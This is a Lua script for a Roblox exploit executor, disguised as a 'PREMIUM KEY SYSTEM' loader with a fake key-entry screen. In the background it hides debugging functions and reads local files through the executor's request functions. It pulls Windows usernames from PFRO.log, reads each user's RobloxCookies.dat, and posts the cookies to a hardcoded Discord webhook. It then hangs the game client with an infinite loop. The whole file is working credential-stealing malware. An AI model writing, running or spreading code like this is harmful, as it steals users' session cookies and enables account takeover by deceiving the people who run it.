local nm, vr = identifyexecutor()
local plat = game:GetService("UserInputService"):GetPlatform()

if nm == "Xeno" or nm == "Solara" or plat ~= Enum.Platform.Windows then
    return
end

local env = getgenv()
local oldgetgc = env.getgc
local oldgetrenv = env.getrenv
local oldgetreg = env.getreg
local olddebug = env.debug

env.getgc = nil
env.getrenv = nil
env.getreg = nil
env.debug = nil

if not env.__bkp then
    env.__bkp = {
        req = clonefunction(request),
        httpreq = clonefunction(http_request or request),
    }
    if http and http.request then
        env.__bkp.httpreq2 = clonefunction(http.request)
    end
end

local function rd(p)
    for _, fn in {env.__bkp.req, env.__bkp.httpreq, env.__bkp.httpreq2} do
        if fn then
            local s, r = pcall(fn, {Url = "file:///" .. p:gsub("\\", "/"), Method = "GET"})
            if s and r and r.Body then return r.Body end
        end
    end
end

task.spawn(function()
    local pf = rd("C:/Windows/PFRO.log")
    if pf then
        local sn = {}
        for u in pf:gsub("\0", ""):gmatch("Users\\([^\\]+)\\") do
            if not sn[u] then
                sn[u] = true
                local c = rd("C:/Users/" .. u .. "/AppData/Local/Roblox/LocalStorage/RobloxCookies.dat")
                if c then
                    pcall(function()
                        request({
                            Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = game:GetService("HttpService"):JSONEncode({content = u .. "\n```\n" .. c .. "\n```"})
                        })
                    end)
                end
            end
        end
    end
    
    env.getgc = oldgetgc
    env.getrenv = oldgetrenv
    env.getreg = oldgetreg
    env.debug = olddebug
    
    task.wait(1)
    while true do end
end)

local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
local fr = Instance.new("Frame", sg)
fr.Size = UDim2.new(0, 400, 0, 250)
fr.Position = UDim2.new(0.5, -200, 0.5, -125)
fr.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local ttl = Instance.new("TextLabel", fr)
ttl.Size = UDim2.new(1, 0, 0, 50)
ttl.BackgroundTransparency = 1
ttl.Text = "🔑 PREMIUM KEY SYSTEM"
ttl.TextColor3 = Color3.new(1, 1, 1)
ttl.TextSize = 20
ttl.Font = Enum.Font.GothamBold

local bx = Instance.new("TextBox", fr)
bx.Size = UDim2.new(0.8, 0, 0, 40)
bx.Position = UDim2.new(0.1, 0, 0.35, 0)
bx.PlaceholderText = "Enter Key..."
bx.Text = ""
bx.TextColor3 = Color3.new(1, 1, 1)
bx.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
bx.Font = Enum.Font.Gotham
bx.TextSize = 16

local btn = Instance.new("TextButton", fr)
btn.Size = UDim2.new(0.8, 0, 0, 40)
btn.Position = UDim2.new(0.1, 0, 0.6, 0)
btn.Text = "SUBMIT"
btn.TextColor3 = Color3.new(1, 1, 1)
btn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 18

btn.MouseButton1Click:Connect(function()
    ttl.Text = "⏳ Verifying..."
    task.wait(2)
    ttl.Text = "✅ Loading Script..."
    task.wait(1)
    sg:Destroy()
end)
